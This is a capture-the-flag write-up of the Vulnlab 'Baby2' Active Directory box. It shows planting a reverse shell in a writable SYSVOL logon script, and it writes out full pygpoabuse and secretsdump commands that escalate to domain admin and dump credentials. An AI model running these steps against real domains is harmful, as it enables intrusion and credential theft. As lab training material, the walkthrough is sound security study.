# Baby2 -- Vulnlab (write-up)

**Difficulty:** Medium
**Box:** Baby2 (Vulnlab)
**Author:** dkrxhn
**Date:** 2025-10-22

---

## TL;DR

### AD box. Enumerated users and found a writable logon script in SYSVOL. Edited login.vbs for a shell as carl, then abused GPO permissions with pygpoabuse to add user to local admins. Secretsdump for domain admin.
---
## Target info

- Host: `10.10.92.192`
- Domain: `baby2.vl`
---
## Enumeration

![Nmap results](images/baby2-vl_1.png)

![Enumeration continued](images/baby2-vl_2.png)

![SMB shares](images/baby2-vl_3.png)

![User enumeration](images/baby2-vl_4.png)

![Further enumeration](images/baby2-vl_5.png)

![LDAP enumeration](images/baby2-vl_6.png)

![Share access](images/baby2-vl_7.png)

![File listing](images/baby2-vl_8.png)

![Permissions check](images/baby2-vl_9.png)

![SYSVOL contents](images/baby2-vl_10.png)

---
## Initial foothold

Found `login.vbs.lnk` pointing to `logon.vbs` in the SYSVOL share. With carl's access, confirmed the file was writable. Downloaded `login.vbs`, added a reverse shell, then re-uploaded with `put`.

![Editing login.vbs](images/baby2-vl_11.png)

![Upload](images/baby2-vl_12.png)

![Shell callback](images/baby2-vl_13.png)

---
## Privesc

![Shell as carl](images/baby2-vl_14.png)

![GPO enumeration](images/baby2-vl_15.png)

Found the Default Domain Policy GPO ID in SYSVOL:

```
\\BABY2.VL\SYSVOL\BABY2.VL\POLICIES\{31B2F340-016D-11D2-945F-00C04FB984F9}
```

Used pygpoabuse to add `gpoadm` to local administrators:

```bash
pygpoabuse.py 'baby2.vl/gpoadm:Password123!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -f -dc-ip 10.10.92.192 -command 'net localgroup administrators /add gpoadm'
```

![GPO abuse](images/baby2-vl_16.png)

Then used secretsdump:

```bash
secretsdump.py baby2.vl/gpoadm:Password123!@10.10.92.192
```

![Secretsdump](images/baby2-vl_17.png)

![Domain admin](images/baby2-vl_18.png)

Followed this walkthrough for reference: <https://medium.com/@persecure/baby2-vulnlab-33fa8a52d245>

---
## Lessons & takeaways

- Writable logon scripts in SYSVOL are a common AD foothold
- GPO abuse (pygpoabuse) can escalate privileges when a user has write access to a GPO
- Always check SYSVOL for scripts and policies that may be editable
---
